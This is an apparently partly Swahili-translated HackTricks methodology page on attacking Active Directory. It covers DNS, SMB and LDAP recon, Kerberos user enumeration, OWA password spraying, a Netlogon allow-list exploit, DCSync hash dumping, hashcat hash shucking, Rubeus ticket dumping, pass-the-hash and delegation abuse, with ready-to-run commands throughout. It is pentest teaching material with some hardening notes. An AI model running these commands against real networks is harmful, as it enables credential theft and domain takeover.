# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** hutumika kama teknolojia ya msingi, ikiwapa **network administrators** uwezo wa kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya network. Imeundwa kupanuka, ikirahisisha upangaji wa idadi kubwa ya users katika **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** katika viwango mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **users** au **devices**, zinazoshiriki database moja ya pamoja. **Trees** ni vikundi vya hizi domains vilivyounganishwa na muundo wa pamoja, na **forest** huwakilisha mkusanyiko wa trees nyingi, zilizounganishwa kupitia **trust relationships**, na kuunda tabaka la juu zaidi la muundo wa shirika. **Access** na **communication rights** mahususi zinaweza kuteuliwa katika kila moja ya viwango hivi.

Dhana kuu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusu Active Directory objects.
2. **Object** – Humaanisha taasisi ndani ya directory, ikiwa ni pamoja na **users**, **groups**, au **shared folders**.
3. **Domain** – Hutumika kama chombo cha kuhifadhia directory objects, na uwezo wa domains nyingi kuishi pamoja ndani ya **forest**, kila moja ikidumisha mkusanyiko wake wa objects.
4. **Tree** – Mkusanyiko wa domains zinazoshiriki common root domain.
5. **Forest** – Kilele cha muundo wa shirika katika Active Directory, kilichoundwa na trees kadhaa zenye **trust relationships** baina yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya network. Huduma hizi ni pamoja na:

1. **Domain Services** – Hujumuisha storage ya data na hudhibiti mwingiliano kati ya **users** na **domains**, ikiwemo **authentication** na uwezo wa **search**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Husaidia applications zinazowezeshwa na directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** ili kuthibitisha users katika web applications nyingi ndani ya session moja.
5. **Rights Management** – Husaidia kulinda copyright material kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Muhimu kwa utatuzi wa **domain names**.

Kwa maelezo zaidi angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji **kuelewa** vizuri sana **Kerberos authentication process**.\
[**Soma ukurasa huu ikiwa bado hujui jinsi inavyofanya kazi.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kuchukua mengi kutoka [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muhtasari wa haraka wa ni amri gani unaweza kuendesha ili ku-enumerate/exploit AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** kwa ajili ya kufanya actions. Ukijaribu kufikia machine kwa IP address, **itatumia NTLM na si kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una access tu kwa mazingira ya AD lakini huna credentials/sessions, unaweza:

- **Pentest the network:**
- Scan network, pata machines na open ports na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md).
- Ku-enumerate DNS kunaweza kutoa taarifa kuhusu key servers ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia mwongozo wa jumla wa [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) ili kupata taarifa zaidi kuhusu jinsi ya kufanya hivi.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye toleo za kisasa za Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina zaidi wa jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina zaidi wa jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (weka mkazo **maalum kwenye anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa [**kuiga services kwa kutumia Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Fikia host kwa [**kudhulumu relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **kufichua** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Toa usernames/names kutoka kwenye internal documents, social media, services (hasa web) ndani ya domain environments na pia kutoka kwa taarifa zinazopatikana hadharani.
- Ukipata majina kamili ya wafanyakazi wa company, unaweza kujaribu tofauti za AD **username conventions (**[**soma hili**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Mifumo ya kawaida zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila moja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 za nasibu na nambari 3 za nasibu_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia msimbo wa **Kerberos error** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, jambo linalotuwezesha kubaini kwamba username haikuwa halali. **Valid usernames** zitasababisha ama **TGT in a AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa user anatakiwa kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kwa kutumia auth-level = 1 (No authentication) dhidi ya interface ya MS-NRPC (Netlogon) kwenye domain controllers. Njia hii huita function `DsrGetDcNameEx2` baada ya kufunga MS-NRPC interface ili kuangalia kama user au computer ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ukipata mojawapo ya seva hizi kwenye mtandao unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  na hii nyingine ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **jina la watu wanaofanya kazi kwenye kampuni** kutoka kwenye hatua ya recon ambayo unapaswa kuwa umefanya kabla ya hili. Kwa jina la kwanza na la ukoo unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuunda usernames zinazoweza kuwa sahihi.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Hata baada ya **Zerologon** ku-patch kwenye DC, akaunti zilizo allow-listed kwa uwazi bado zinaweza kufichuliwa kwa **legacy/vulnerable Netlogon secure-channel behavior**. Mipangilio yenye hatari ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au thamani inayolingana ya registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Thamani hiyo ni **SDDL security descriptor** (ona [Security Descriptors](security-descriptors.md)). Akaunti au group yoyote iliyopewa ACE husika katika DACL inaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` kwa vitendo hu-allow-list **Everyone**.

Mtiririko wa kazi wa operator kwa vitendo:

1. **Tambua principals zilizo allow-listed** kwa kuangalia **SYSVOL/GPO** na **live DC registry**.
2. **Rekebisha SIDs** zilizopatikana kwenye SDDL kuwa AD users/computers halisi na kipaumbele kwa **DC machine accounts**, **trust accounts**, na machines nyingine zenye privileges.
3. Jaribu mara kwa mara **MS-NRPC / Netlogon authentication** kama account iliyopo kwenye allow-list.
4. Baada ya guess kufanikiwa, tumia vibaya **Netlogon password-setting** ku-reset password ya target account (public PoC huiweka kuwa empty string).

Mifano ya haraka ya triage / lab kutoka kwenye public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- The **scanner** ni muhimu kwa sababu allow-list yenye ufanisi inaweza kuwepo katika **SYSVOL**, katika **registry**, au katika zote mbili.
- Njia yenyewe ya exploit ni muhimu kwa sababu **haihitaji Domain Admin privileges** mara tu akaunti iliyo hatarishi imegunduliwa.
- Ku-compromise **Domain Controller machine account** kama `DC$` ni hatari sana kwa sababu ku-reset password hiyo kunaweza moja kwa moja kuwezesha njia pana zaidi za **AD takeover**.
- Uwezekano wa **brute-force** unategemea mode: artifact ya umma inaelezea mbinu ya meet-in-the-middle, **24-bit** brute force wakati akaunti nyingine ya computer inapatikana, na variants za **32-bit** zenye kasi ndogo.

Detection / hardening notes:

- Audit policy ya allow-list na ondoa kila kitu isipokuwa exceptions za muda, zinazohitajika wazi kwa compatibility.
- Fuatilia matukio ya DC **System** **5827/5828/5829/5830/5831** ili kubaini connections za Netlogon zilizo vulnerable zinazokataliwa, kugunduliwa, au kuruhusiwa wazi na policy.
- Chukulia akaunti zilizo katika `VulnerableChannelAllowList` kama **high-risk** hadi dependency ya zamani iondolewe.

### Knowing one or several usernames

Sawa, basi unajua tayari una username halali lakini hakuna passwords... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa user **hana** attribute _DONT_REQ_PREAUTH_ unaweza **kuomba AS_REP message** kwa user huyo ambayo itakuwa na data fulani iliyosimbwa kwa kutumia derivation ya password ya user.
- [**Password Spraying**](password-spraying.md): Tujaribu passwords zilizo **common** zaidi na kila user aliyegunduliwa, labda user fulani anatumia password mbaya (kumbuka password policy!).
- Kumbuka kwamba unaweza pia **kufanya spray kwenye OWA servers** ili kujaribu kupata access ya mail servers za users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza **kupata** baadhi ya challenge **hashes** za crack kwa **poisoning** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa ku-enumerate active directory, utakuwa na **emails zaidi na uelewa bora wa network**. Unaweza pia kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  ili kupata access ya AD env.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** ili kuhifadhi state ya AD recon kwa kila engagement: `workspace create <name>` huanzisha SQLite DBs za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha views kwa `proto smb|mssql|winrm` na orodhesha secrets zilizokusanywa kwa `creds`. Futa manually data nyeti unapomaliza: `rm -rf ~/.nxc/workspaces/<name>`.
- Ugunduzi wa haraka wa subnet kwa **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members wanaoonyesha `(signing:False)` ni **relay-prone**, ilhali DCs mara nyingi huhitaji signing.
- Tengeneza **hostnames katika /etc/hosts** moja kwa moja kutoka kwenye output ya NetExec ili kurahisisha targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay kwa DC imezuiwa** na signing, bado chunguza hali ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / weak channel binding. DC yenye SMB signing required lakini LDAP signing disabled bado ni lengo linalowezekana la **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs wakati mwingine **huingiza masked admin passwords katika HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (mfano, `<input value="<password>">`), kuruhusu Basic-auth access kuchanganua/kuprint repositori.
- Retrieved print jobs zinaweza kuwa na **plaintext onboarding docs** zenye passwords za kila mtumiaji. Weka pairing zikiendana unapojaribu:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Tumia shucking wakati:

- Una NT corpus kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu reuse katika domains/forests nyingine.
- Unakamata Kerberos material ya msingi wa RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka reuse kwa passphrases ndefu zisizoweza crackwa na mara moja pivot kupitia Pass-the-Hash.

Technique hii **haifanyi kazi** dhidi ya encryption types ambazo keys zake si NT hash (mfano, Kerberos etype 17/18 AES). Ikiwa domain inatumia AES-only, lazima urudi kwenye regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` with history kupata seti kubwa zaidi possible ya NT hashes (na values zake za awali):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries huongeza kwa kiasi kikubwa candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila account. Kwa njia zaidi za kuchimba NTDS secrets ona:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) huchukua local SAM/SECURITY data na cached domain logons (DCC/DCC2). Ondoa duplicates na uongeze hashes hizo kwenye list ile ile `nt_candidates.txt`.
- **Track metadata** – Hifadhi username/domain iliyotoa kila hash (hata ikiwa wordlist ina hex tu). Matching hashes zinakuambia mara moja ni principal gani inayotumia tena password mara Hashcat inapochapisha winning candidate.
- Pendelea candidates kutoka same forest au trusted forest; hilo huongeza chance ya overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Zima rule engines (hakuna `-r`, hakuna hybrid modes) kwa sababu mangling huharibu candidate key material.
- Modes hizi si inherently faster, lakini NTLM keyspace (~30,000 MH/s on M3 Max) ni ~100× quicker kuliko Kerberos RC4 (~300 MH/s). Kujaribu curated NT list ni rahisi zaidi kuliko kuchunguza entire password space katika slow format.
- Daima endesha **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zilikuja hivi karibuni.
- Kwa sasa hakuna NT mode kwa AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu keys zake hupatikana kupitia PBKDF2 kutoka UTF-16LE passwords, si raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutoa RC4 key kutoka kwa kila NT candidate na huvalidate `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia moja ya existing NT hashes zako.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Unaweza hiari kurecover plaintext baadaye kwa `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

Workflow hii ile ile inatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Mara match inapopatikana unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au re-crack NT hash kwa masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umeweza kuorodhesha active directory utakuwa na **barua pepe zaidi na uelewa bora wa network**. Unaweza kuweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una credentials za msingi unaweza kuangalia kama unaweza **kupata** faili zozote **zinazovutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo manually lakini ni kazi ya kuchosha na ya kurudia-rudia sana (na zaidi ikiwa utapata mamia ya docs unazohitaji kuchunguza).

[**Fuata link hii ili kujifunza kuhusu tools unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kufikia PCs nyingine au shares** unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa kwa namna fulani zita**anzisha NTLM authentication dhidi yako** ili uweze **kuiba** **NTLM challenge** na kuicrack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu uliwaruhusu watumiaji wowote waliothibitishwa **ku-compromise domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa technique zifuatazo mtumiaji wa kawaida wa domain haitoshi, unahitaji baadhi ya special privileges/credentials ili kutekeleza attacks hizi.**

### Hash extraction

Kwa matumaini umeweza **ku-compromise account ya local admin** fulani kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) pamoja na relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa dump hashes zote zilizo kwenye memory na locally.\
[**Soma ukurasa huu kuhusu njia tofauti za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya user**, unaweza kuitumia ili **kuiga** user huyo.\
Unahitaji kutumia **tool** fulani itakayo**fanya** **NTLM authentication kwa kutumia** hash hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuinject** hash hiyo ndani ya **LSASS**, ili wakati wowote **NTLM authentication inapofanyika**, hash hiyo itatumika. Chaguo la mwisho ndilo ambalo mimikatz hufanya.\
[**Soma ukurasa huu kwa taarifa zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Attack hii inalenga **kutumia user NTLM hash kuomba Kerberos tickets**, kama mbadala wa Pass The Hash ya kawaida kupitia NTLM protocol. Hivyo, hii inaweza kuwa hasa **muhimu kwenye networks ambapo NTLM protocol imezimwa** na ni **Kerberos pekee inaruhusiwa** kama authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya attack ya **Pass The Ticket (PTT)**, attackers **huiba authentication ticket ya user** badala ya password yake au hash values. Ticket hii iliyoliwa hutumika kisha **kum-impersonate user**, kupata access isiyoidhinishwa kwa resources na services ndani ya network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **ku-login locally** kwenye **PCs** nyingine kwa hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

